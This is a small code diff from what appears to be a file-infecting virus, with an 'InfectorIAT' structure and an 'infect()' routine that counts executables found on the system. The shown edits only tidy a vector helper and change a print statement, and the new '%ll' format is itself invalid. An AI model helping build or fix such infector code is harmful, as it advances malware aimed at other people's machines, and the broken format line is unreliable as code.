@@ -141,7 +141,10 @@ void cvector_realloc(InfectorIAT *iat, CVector *vector, size_t elements)
       return;
    
    if (elements == 0 || elements == vector->elements)
-      return cvector_free(iat, vector);
+   {
+      cvector_free(iat, vector);
+      return;
+   }
    
    vector->elements = elements;
    vector->data = iat->realloc(vector->data, CVECTOR_BYTES(vector));
@@ -396,7 +399,7 @@ int infect(void)
       iat.free(search_visit);
    }
 
-   printf("%d executables were found.\n", found_executables.elements);
+   printf("%ll executables were found.\n", found_executables.elements);
 
    for (size_t i=0; i<found_executables.elements; ++i)
    {
